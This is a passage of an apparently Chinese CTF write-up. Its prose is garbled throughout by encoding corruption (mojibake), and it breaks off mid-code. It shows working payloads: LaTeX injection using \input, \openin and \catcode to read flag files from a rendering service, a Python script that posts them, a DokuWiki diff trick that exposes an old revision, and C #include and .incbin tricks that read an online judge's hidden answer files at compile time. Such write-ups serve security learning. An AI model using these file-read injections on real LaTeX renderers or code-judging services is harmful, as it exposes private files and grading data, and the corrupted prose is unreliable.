<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>var isLess <span style="color:#f92672">=</span> guess <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var isMore <span style="color:#f92672">=</span> guess <span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1e-6</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>var isPassed <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>isLess <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>isMore<span style="color:#f92672">;</span>
</span></span></code></pre></div><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥ <code>var isPassed = guess == this.number * 1e6</code> å‘¢ï¼Ÿ</p>
<p>éš¾é“æ˜¯å› ä¸ºç²¾åº¦ï¼Ÿå¯æ˜¯è¿™ä¸ªç¨‹åºè¯»å…¥ç”¨æˆ·è¾“å…¥çš„æ—¶å€™æ˜¯ç›´æ¥æŠŠè¾“å…¥çš„å°æ•°å½“æˆå­—ç¬¦ä¸²ï¼Œæˆªå–äº†å°æ•°éƒ¨åˆ†å½“ä½œä¸€ä¸ªæ•´æ•°æ¥å¤„ç†çš„ï¼Œè¿™é‡Œå´ç”¨å°æ•°éš¾é“ä¸æ˜¯å¾ˆå¯ç–‘å—ï¼Ÿ</p>
<p>æ„Ÿè§‰å‡ºé¢˜äººåœ¨è¿™é‡Œåšäº†æ‰‹è„šï¼Œäºæ˜¯ç¬”è€…å°±åœ¨æƒ³æ€ä¹ˆè®© <code>isPassed</code> å˜ä¸º <code>true</code> ã€‚</p>
<p>æ˜¾ç„¶ <code>isLess</code> å’Œ <code>isMore</code> éƒ½ä¸º <code>false</code> æ—¶ã€‚</p>
<p>é‚£é™¤äº† <code>guess == this.number - 1e-6 / 2</code> ï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•è®© <code>isLess</code> å’Œ <code>isMore</code> éƒ½ä¸º <code>false</code> å—ï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯ï¼šæ¯”è¾ƒæ“ä½œçš„ä¸¤ä¸ªæ“ä½œæ•°ä¸­å‡ºç° <code>NaN</code> æ—¶ï¼Œè¿”å›å€¼ä¸º <code>false</code> ã€‚</p>
<p>æµè§ˆç½‘é¡µä»£ç ï¼Œæ‰¾åˆ°å‡½æ•° <code>change(value)</code> å’Œ <code>submit()</code> ï¼Œåœ¨æ§åˆ¶å°è¾“å…¥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">change</span>(<span style="color:#66d9ef">NaN</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">submit</span>()
</span></span></code></pre></div><p>å¾—åˆ° flag <code>flag{gu3ss-n0t-a-numb3r-1nst3ad-...}</code></p>
<h2 id="latex-æœºå™¨äºº">LaTeX æœºå™¨äºº</h2>
<p>æŠŠåç«¯ä»£ç ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹ï¼Œæœºå™¨äººåŸç†æ˜¯æŠŠç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬æ’å…¥åˆ°ä¸‹é¢è¿™ä¸ª tex æ–‡ä»¶çš„ç¬¬ 3 è¡Œå’Œç¬¬ 4 è¡Œä¹‹é—´ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tex" data-lang="tex"><span style="display:flex;"><span><span style="color:#66d9ef">\documentclass</span><span style="color:#a6e22e">[preview]</span>{standalone}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\begin</span>{document}
</span></span><span style="display:flex;"><span><span style="color:#e6db74">$$</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">$$</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\end</span>{document}
</span></span></code></pre></div><p>å…ˆè¯•ç€è¾“å…¥ä¸€ä¸ª <code>$$ \beta $$</code> ï¼Œè¿”å›è§£æå¤±è´¥ã€‚</p>
<p>å› æ­¤è¿™ä¸ªé¢˜å°±åº”è¯¥ç”¨å››ä¸ª <code>$</code> æŠŠ base.tex é‡Œçš„å…¬å¼ç¬¦å·é—­åˆï¼Œç„¶åå†è¿›è¡Œå„ç§å¥‡æ€ªçš„æ“ä½œï¼Œå¾—åˆ° flag ã€‚</p>
<p>å»æœç´¢â€œlatex åŒ…å«æ–‡æœ¬æ–‡ä»¶â€ ï¼Œå¾—çŸ¥å¯ä»¥ä½¿ç”¨å® <code>\input</code> å’Œ <code>\include</code> ï¼Œå…¶ä¸­ <code>\include</code> ä¼šå¯¼è‡´æ¢é¡µï¼Œæœºå™¨äººæˆªå›¾çœ‹ä¸åˆ°å†…å®¹ã€‚</p>
<p>è¾“å…¥ <code>$$ \input{/flag1} $$</code> å¾—åˆ° flag ã€‚</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/HQ5L9X4myZV2UpJ.png" alt="20221027_7.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å®Œæˆç¬¬ä¸€é—®ä¹‹åï¼Œç¬”è€…å°±å»å°è¯•ç¬¬äºŒé—®äº†ï¼Œä½†æ˜¯ä¸€ç›´æ²¡èƒ½åšå‡ºæ¥ã€‚</p>
<p>è¿™ä¸€é¢˜çš„ç¬¬äºŒé—®æ˜¯ç¬”è€…æœ¬æ¬¡æ¯”èµ›åšå‡ºæ¥çš„æœ€åä¸€é“é¢˜ç›®ã€‚</p>
<p>é¦–å…ˆï¼Œç¬”è€…å®Œå…¨ä¸çŸ¥é“ <code>#</code> åœ¨ Latex ä¸­æ„å‘³ç€ä»€ä¹ˆï¼Œæœä¹Ÿæ²¡æœåˆ°ã€‚</p>
<p>åæ¥åœ¨äº†è§£ Latex å®çš„è¿‡ç¨‹ä¸­ç»ˆäºææ˜ç™½ <code>#</code> çš„åŠŸèƒ½æ˜¯åœ¨å®å†…éƒ¨è¡¨ç¤ºè¿™ä¸ªå®æ¥æ”¶çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>#1</code> è¡¨ç¤ºè¿™ä¸ªå®çš„ç¬¬ 1 ä¸ªå‚æ•°ï¼Œ<code>#2</code> è¡¨ç¤ºè¿™ä¸ªå®çš„ç¬¬ 2 ä¸ªå‚æ•°ã€‚</p>
<p>ä½†è¿™å¹¶ä¸èƒ½å¯¹è§£é¢˜èµ·åˆ°å¸®åŠ©ï¼Œè¯¥ä¸ä¼šè¿˜æ˜¯ä¸ä¼šã€‚</p>
<p>ç¬”è€…åˆå» Google äº†åŒ…æ‹¬ä½†ä¸é™äºä¸‹åˆ—å…³é”®è¯ï¼š</p>
<ul>
<li>latex include plain text with escape chars</li>
<li>latex verb include</li>
<li>latex verbatim</li>
<li>latex texttt</li>
<li>latex listing</li>
<li>latex verbatiminput</li>
<li>latex ignore special chars escape chars</li>
<li>latex usepackage in document</li>
<li>latex multi document</li>
<li>latex replace</li>
<li>Embedded Latex(æœè¿™ä¸ªæ˜¯å—åˆ°äº†å®‰å…¨ OJ é‚£é¢˜çš„å¯å‘)</li>
<li>latex commandchars</li>
<li>How to include plain text with special chars</li>
<li>&hellip;</li>
</ul>
<p>å¹¶ä¸”åšäº†ä¸€ä¸ª Python è„šæœ¬æ–¹ä¾¿ä¸Šä¼  tex è¯­å¥</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34; $$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">newread</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">recipientfile
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">openin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">recipientfile=/flag1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">read</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">recipientfile to</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">email
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">closein</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">recipientfile
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">texttt{</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">email}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">verb|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">email|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$$ &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;latex-text&#34;</span>: text<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34; &#34;</span>),
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://202.38.93.111:10020/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>header, data<span style="color:#f92672">=</span>data)<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(ret, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>img_list <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#34;img&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(img_list) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>	print(str(img_list[<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">10</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;error&#34;</span>)
</span></span></code></pre></div><p>ç»è¿‡æ— æ•°æ¬¡å°è¯•ä¸ error ï¼Œç»ˆäºï¼Œåœ¨æœç´¢â€œlatex import text file with special characters site:tex.stackexchange.comâ€ æ—¶ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªé¡µé¢ <a href="https://tex.stackexchange.com/questions/630044/how-can-i-input-multiple-txt-files-with-special-characters-into-my-main-tex-file" target="_blank" rel="noopener">https://tex.stackexchange.com/questions/630044/how-can-i-input-multiple-txt-files-with-special-characters-into-my-main-tex-file</a></p>
<p>å€’æ•°ç¬¬äºŒä¸ªå›ç­”æ˜¯è¿™æ ·çš„</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-tex" data-lang="tex"><span style="display:flex;"><span><span style="color:#66d9ef">\documentclass</span>{article}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\usepackage</span><span style="color:#a6e22e">[T1]</span>{fontenc}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\begin</span>{document}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\section</span>{File 2}
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\catcode</span>`<span style="color:#66d9ef">\$</span>=12
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\catcode</span>`<span style="color:#66d9ef">\_</span>=12
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\catcode</span>`<span style="color:#66d9ef">\^</span>=12
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\catcode</span>`<span style="color:#66d9ef">\%</span>=12
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\catcode</span>`<span style="color:#66d9ef">\~</span>=12
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\input</span>{file2.txt}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">\end</span>{document}
</span></span></code></pre></div><p>è¿™ä¸ª <code>\catcode</code> ä¼¼ä¹å¯¹è¿™äº›ç‰¹æ®Šç¬¦å·è¿›è¡Œäº†ä¸€ä¸ªä»€ä¹ˆèµ‹å€¼æ“ä½œã€‚</p>
<p>äºæ˜¯ç¬”è€…ç«‹åˆ»å»æœç´¢è¿™æ¡å®ï¼Œåœ¨ WIKIBOOKS ä¸Šæ‰¾åˆ°è§£é‡Šï¼š</p>
<blockquote>
<p>\catcode is the command that&rsquo;s used to change the category code of a character.</p>
</blockquote>
<p>ç»™å‡ºçš„ä¾‹å­å±•ç¤ºäº†å°† <code>@</code> çš„ category code æ”¹å˜ä¸º 11 ï¼Œä¹Ÿå°±æ˜¯ Letter ï¼Œä»¥å®ç°ç›´æ¥è¾“å‡º <code>@</code> çš„åŠŸèƒ½ï¼Œè¿™æ­£æ˜¯æˆ‘æƒ³è¦çš„ã€‚</p>
<p>äºæ˜¯ä¿®æ”¹ä¸Šé¢ Python ä»£ç ï¼Œ</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34; $$
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">catcode`</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#=11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">catcode`</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_=11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">input{/flag2}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$$ &#34;&#34;&#34;</span>
</span></span></code></pre></div><p>é¡ºåˆ©è¾“å‡º flag</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/sPYpVNUKEZnm6Bc.png" alt="20221027_8.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>å›¾ä¸­çš„ç‚¹æ˜¯ä¸‹åˆ’çº¿ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå˜æˆäº†è¿™æ ·çš„ç‚¹ã€‚</p>
<h2 id="flag-çš„ç—•è¿¹">Flag çš„ç—•è¿¹</h2>
<p>åœ¨åŸºäº Dokuwiki çš„ FlagWiki ä¸Šè¿›è¡Œæ“ä½œï¼Œå’Œå»å¹´åœ¨æ•°æ®åº“é‡Œæ‰¾é‚®ç®±å¾ˆåƒï¼Œå› æ­¤é¦–å…ˆæƒ³åˆ°åœ¨ url åé¢åŠ è¯·æ±‚ã€‚</p>
<p>æœç„¶ï¼Œç‚¹å‡» Media Manager ä¹‹åï¼Œurl å˜æˆäº† <code>http://202.38.93.111:15004/doku.php?id=start&amp;do=media&amp;ns=</code> ã€‚</p>
<p>å» Dokuwiki å®˜ç½‘ä¸Šæ‰¾å¯ä»¥çœ‹åˆ°å†å²è®°å½•çš„å‘½ä»¤ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå‘ç°å¤§éƒ¨åˆ†éƒ½è¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯ <code>diff</code> å¯ä»¥ç”¨ã€‚</p>
<p>è¾“å…¥ <code>http://202.38.93.111:15004/doku.php?do=diff</code> ï¼Œå¾€å‰ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¾—åˆ° flag</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/ceC4i2xSdDFMzmG.png" alt="20221027_9.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<h2 id="å®‰å…¨çš„åœ¨çº¿æµ‹è¯„">å®‰å…¨çš„åœ¨çº¿æµ‹è¯„</h2>
<p>ä»åˆ¤é¢˜è„šæœ¬å¯ä»¥çœ‹åˆ°æ•°æ®çš„ä½ç½®ï¼Œç›´æ¥åšä¸€ä¸ªç¨‹åºè¯»å– <code>/data/static.out</code> å¹¶è¾“å‡º</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">freopen</span>(<span style="color:#e6db74">&#34;./data/static.out&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, stdin);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (c <span style="color:#f92672">!=</span> EOF)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">putchar</span>(c);
</span></span><span style="display:flex;"><span>		c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æ‹¿åˆ°ç¬¬ä¸€ä¸ª flag <code>flag{the_compiler_is_my_eyes_20ee4a8a38}</code></p>
<p>çœ‹åˆ°ç¬¬ä¸€ä¸ª flag çš„æ—¶å€™ï¼Œç¬”è€…è¿˜ä»¥ä¸ºè¿™ä¸ª flag å†…å®¹æ˜¯ç¬¬äºŒé—®çš„æç¤ºï¼Œç°åœ¨çœ‹æ¥åº”è¯¥æ˜¯ç¬¬ä¸€é—®ç¬”è€…åšäº†ä¸ªéé¢„æœŸè§£ã€‚</p>
<p>ä¸è¿‡è¿™ä¸ª flag ç¡®å®å¯¹åšç¬¬äºŒé—®æœ‰å¸®åŠ©ã€‚</p>
<p>åæ¥ç¬”è€…æƒ³é€šè¿‡ç›¸åŒçš„æ–¹æ³•é€šè¿‡åŠ¨æ€æ•°æ®ï¼Œä½†æ˜¯å‘ç°åŠ¨æ€æ•°æ®çš„æ–‡ä»¶æ˜¯æ²¡æœ‰è¯»å–æƒé™çš„ã€‚</p>
<p>è§‚å¯Ÿç»™å‡ºçš„åˆ¤é¢˜è„šæœ¬ï¼Œå‘ç°ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
</span></span><span style="display:flex;"><span>	[<span style="color:#e6db74">&#34;gcc&#34;</span>, <span style="color:#e6db74">&#34;-w&#34;</span>, <span style="color:#e6db74">&#34;-O2&#34;</span>, SRC, <span style="color:#e6db74">&#34;-o&#34;</span>, BIN],
</span></span><span style="display:flex;"><span>	stdout<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout,
</span></span><span style="display:flex;"><span>	stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>DEVNULL,
</span></span><span style="display:flex;"><span>	stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>STDOUT
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>æ‰§è¡Œçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
</span></span><span style="display:flex;"><span>	[<span style="color:#e6db74">&#34;su&#34;</span>, <span style="color:#e6db74">&#34;runner&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, path],
</span></span><span style="display:flex;"><span>	input<span style="color:#f92672">=</span>input,
</span></span><span style="display:flex;"><span>	stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,
</span></span><span style="display:flex;"><span>	stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>STDOUT,
</span></span><span style="display:flex;"><span>	timeout<span style="color:#f92672">=</span>timeout
</span></span><span style="display:flex;"><span>)
</span></span></code></pre></div><p>å› æ­¤æ‰§è¡Œè¿‡ç¨‹ä¸­æ²¡æœ‰æƒé™è¯»å–è¾“å‡ºæ–‡ä»¶ã€‚</p>
<p>é‚£ç¼–è¯‘çš„æ—¶å€™æœ‰æƒé™æŸ¥çœ‹å—ï¼Ÿè¯•ä¸€ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> a <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#960050;background-color:#1e0010">#</span>include <span style="color:#e6db74">&#34;../data/dynamic0.out&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>å‘ç°æœç„¶èƒ½è¾“å‡ºæ–‡ä»¶å†…å®¹</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/WvMVSsXuPa4EjfH.png" alt="20221027_10.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>è¿™æ—¶æ‰æ„è¯†åˆ°ç¬¬ä¸€é—®çš„ flag æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p>
<p>é¢„æœŸè§£åº”è¯¥æ˜¯ç”¨ç¼–è¯‘å™¨å»çœ‹é™æ€æ•°æ®ï¼Œç„¶åé‡å†™ä¸€ä¸ªç¨‹åºè¾“å‡ºï¼Œå› æ­¤ flag å†…å®¹æ‰æ˜¯â€œç¼–è¯‘å™¨æ˜¯æˆ‘çš„çœ¼â€ã€‚</p>
<p>é‚£åŠ¨æ€æ•°æ®å¦‚ä½•å¤„ç†å‘¢ï¼Œç”¨ <code>include</code> å¯ä»¥æŠŠæ•°æ®å¯¼å…¥ï¼Œç”¨ <code>define</code> å¯ä»¥æŠŠå­—é¢å€¼å˜ä¸ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ä¸¤è€…ä¸èƒ½åˆåœ¨ä¸€èµ·ç”¨ã€‚</p>
<p>åˆç»è¿‡äº†æ¼«é•¿çš„æœç´¢ï¼Œå†çŸ¥ä¹ä¸Šå‘ç°äº†è¿™æ ·ä¸€ç¯‡å›ç­” <a href="https://www.zhihu.com/question/431645051/answer/1826562458" target="_blank" rel="noopener">https://www.zhihu.com/question/431645051/answer/1826562458</a> ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œå®Œç¾ç¬¦åˆè¦æ±‚ã€‚</p>
<p>åšå‡ºå¦‚ä¸‹ç¨‹åº</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define EMBED_STR(name, path)                \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  extern const char name[];                  \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  asm(&#34;.section .rodata, \&#34;a\&#34;, @progbits\n&#34; \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	  #name &#34;:\n&#34;                            \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	  &#34;.incbin \&#34;&#34; path &#34;\&#34;\n&#34;               \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	  &#34;.byte 0\n&#34;                            \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	  &#34;.previous\n&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(static_out, <span style="color:#e6db74">&#34;./data/static.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic0_out, <span style="color:#e6db74">&#34;./data/dynamic0.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic1_out, <span style="color:#e6db74">&#34;./data/dynamic1.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic2_out, <span style="color:#e6db74">&#34;./data/dynamic2.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic3_out, <span style="color:#e6db74">&#34;./data/dynamic3.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic4_out, <span style="color:#e6db74">&#34;./data/dynamic4.out&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(static_in, <span style="color:#e6db74">&#34;./data/static.in&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic0_in, <span style="color:#e6db74">&#34;./data/dynamic0.in&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic1_in, <span style="color:#e6db74">&#34;./data/dynamic1.in&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic2_in, <span style="color:#e6db74">&#34;./data/dynamic2.in&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic3_in, <span style="color:#e6db74">&#34;./data/dynamic3.in&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EMBED_STR</span>(dynamic4_in, <span style="color:#e6db74">&#34;./data/dynamic4.in&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> loong{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> arr[<span style="color:#ae81ff">3600</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> length;
</span></span><span style="display:flex;"><span>} loong;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>loong CONST0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	CONST0.length <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3600</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		CONST0.arr[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	}
